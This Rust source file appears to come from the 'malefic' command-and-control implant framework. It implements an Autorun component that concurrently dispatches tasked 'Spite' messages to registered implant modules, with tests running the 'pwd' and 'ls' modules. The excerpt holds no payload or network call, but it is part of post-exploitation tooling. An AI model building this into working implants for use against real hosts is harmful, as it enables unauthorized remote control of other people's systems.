use anyhow::Result;
use futures::channel::mpsc::unbounded;
use futures::stream::{self, StreamExt};
use futures::SinkExt;
use malefic_common::errors::MaleficError;
use malefic_manager::manager::{MaleficManager, ModuleRegister};
use malefic_proto::proto::implantpb::Spite;
use std::sync::{Arc, RwLock};

fn default_manager() -> Result<MaleficManager, MaleficError> {
    let mut manager = MaleficManager::new();
    manager.register_bundle(
        "origin",
        malefic_modules::register_modules as ModuleRegister,
    );
    manager.refresh_module()?;
    Ok(manager)
}

pub struct Autorun {
    module_manager: Arc<RwLock<MaleficManager>>,
    concurrency: usize,
}

impl Autorun {
    pub fn new(concurrency: usize) -> Result<Autorun, MaleficError> {
        Ok(Autorun {
            module_manager: Arc::new(RwLock::new(default_manager()?)),
            concurrency,
        })
    }

    pub async fn execute(&self, tasks: Vec<Spite>) -> Result<Vec<Spite>, MaleficError> {
        let manager = Arc::clone(&self.module_manager);
        let concurrency = self.concurrency.max(1);
        let results: Vec<Spite> = stream::iter(tasks)
            .map(|spite| {
                let mgr = Arc::clone(&manager);
                async move { Self::run_task(mgr, spite).await }
            })
            .buffer_unordered(concurrency)
            .collect()
            .await;
        Ok(results)
    }

    async fn run_task(manager: Arc<RwLock<MaleficManager>>, spite: Spite) -> Spite {
        let body = match spite.body.clone() {
            Some(b) => b,
            None => {
                return Spite {
                    task_id: spite.task_id,
                    error: MaleficError::MissBody.id(),
                    ..Default::default()
                };
            }
        };

        // Acquire the std::sync::RwLock, get an owned instance, then release the lock.
        // new_instance() returns an owned Box<MaleficModule>, so no borrow lives past the guard.
        let mut instance = {
            let manager_guard = match manager.read() {
                Ok(guard) => guard,
                Err(_) => {
                    return Spite {
                        task_id: spite.task_id,
                        error: MaleficError::ModuleError.id(),
                        ..Default::default()
                    };
                }
            };
            match manager_guard.get_module(&spite.name) {
                Some(m) => m.new_instance(),
                None => {
                    return Spite {
                        task_id: spite.task_id,
                        error: MaleficError::ModuleNotFound.id(),
                        ..Default::default()
                    };
                }
            }
        };
        // manager_guard is dropped here, lock is released

        let (mut input_sender, mut input_receiver) = unbounded();
        let (mut output_sender, _output_receiver) = unbounded();

        if input_sender.send(body).await.is_err() {
            return Spite {
                task_id: spite.task_id,
                error: MaleficError::ModuleError.id(),
                ..Default::default()
            };
        }
        drop(input_sender);

        let result = instance
            .run(spite.task_id, &mut input_receiver, &mut output_sender)
            .await;

        match result {
            Ok(result) => result.to_spite(),
            Err(_) => Spite {
                task_id: spite.task_id,
                error: MaleficError::ModuleError.id(),
                ..Default::default()
            },
        }
    }
}

#[cfg(test)]
mod tests {
    use std::fs;
    use std::time::{SystemTime, UNIX_EPOCH};

    use malefic_proto::proto::implantpb::spite::Body;
    use malefic_proto::proto::implantpb::Spite;
    use malefic_proto::proto::modulepb::{LsResponse, Request, Response};

    use super::Autorun;

    fn unique_temp_dir(prefix: &str) -> std::path::PathBuf {
        let unique = SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .unwrap()
            .as_nanos();
        std::env::temp_dir().join(format!("{}-{}", prefix, unique))
    }

    #[test]
    fn autorun_executes_real_pwd_module() {
        let autorun = Autorun::new(1).unwrap();
        let spite = Spite {
            task_id: 7,
            name: "pwd".to_string(),
            body: Some(Body::Request(Request::default())),
            ..Default::default()
        };

        let result = futures::executor::block_on(autorun.execute(vec![spite])).unwrap();

        assert_eq!(result.len(), 1);
        assert_eq!(result[0].task_id, 7);
        assert_eq!(result[0].error, 0);

        let body = result[0].body.clone().expect("pwd should return a body");
        let response = match body {
            Body::Response(response) => response,
            other => panic!("unexpected pwd body: {:?}", other),
        };

        assert_eq!(
            response.output,
            std::env::current_dir()
                .unwrap()
                .to_string_lossy()
                .to_string()
        );
    }

    #[test]
    fn autorun_executes_real_ls_module_with_request_input() {
        let autorun = Autorun::new(1).unwrap();
        let temp_dir = unique_temp_dir("malefic-autorun-ls");
        fs::create_dir_all(&temp_dir).unwrap();
        let expected_file = "sample.txt";
        fs::write(temp_dir.join(expected_file), b"test").unwrap();

        let spite = Spite {
            task_id: 9,
            name: "ls".to_string(),
            body: Some(Body::Request(Request {
                input: temp_dir.to_string_lossy().to_string(),
                ..Default::default()
            })),
            ..Default::default()
        };

        let result = futures::executor::block_on(autorun.execute(vec![spite])).unwrap();
        let _ = fs::remove_dir_all(&temp_dir);

        assert_eq!(result.len(), 1);
        assert_eq!(result[0].task_id, 9);
        assert_eq!(result[0].error, 0);

        let body = result[0].body.clone().expect("ls should return a body");
        let response = match body {
            Body::LsResponse(response) => response,
            other => panic!("unexpected ls body: {:?}", other),
        };

        assert_ls_response(&response, expected_file);
    }

    fn assert_ls_response(response: &LsResponse, expected_file: &str) {
        assert!(response.exists);
        assert!(
            response.files.iter().any(|file| file.name == expected_file),
            "expected '{}' in ls response: {:?}",
            expected_file,
            response.files
        );
    }

    #[allow(dead_code)]
    fn _assert_response_body(response: &Response) {
        assert!(!response.output.is_empty());
    }
}
